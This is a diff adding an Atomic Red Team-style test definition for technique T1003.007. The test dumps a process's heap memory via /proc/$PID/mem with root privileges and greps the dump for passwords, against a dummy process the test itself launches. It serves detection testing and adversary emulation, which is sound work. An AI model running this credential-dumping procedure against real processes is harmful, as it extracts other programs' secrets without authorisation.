@@ -1,0 +1,57 @@
+{
+    "name": "Dump individual process memory with Python (Local)",
+    "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to copy a process's heap memory to an external file so it can be searched or exfiltrated later. On FreeBSD procfs must be mounted. ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "executor": {
+        "name": "sh",
+        "elevation_required": true,
+        "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON #{python_script} $PID #{output_file}\ngrep -i \"PASS\" \"#{output_file}\"\n",
+        "cleanup_command": "rm -f \"#{output_file}\"\n",
+        "type": "Command Executor"
+    },
+    "id": "T1003.007",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Proc Filesystem",
+    "source": "ART",
+    "uuid": "437b2003-a20d-4ed8-834c-4964f24eec63",
+    "arguments": {
+        "output_file": {
+            "description": "Path where captured results will be placed",
+            "type": "path",
+            "default": "/tmp/T1003.007.bin"
+        },
+        "script_path": {
+            "description": "Path to script generating the target process",
+            "type": "path",
+            "default": "/tmp/T1003.007.sh"
+        },
+        "python_script": {
+            "description": "Path to script generating the target process",
+            "type": "path",
+            "default": "PathToAtomicsFolder/T1003.007/src/dump_heap.py"
+        },
+        "pid_term": {
+            "description": "Unique string to use to identify target process",
+            "type": "string",
+            "default": "T1003.007"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Script to launch target process must exist\n",
+            "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
+            "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
+        },
+        {
+            "description": "Requires Python\n",
+            "prereq_command": "(which python || which python3 || which python2)\n",
+            "get_prereq_command": "echo \"Python 2.7+ or 3.4+ must be installed\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
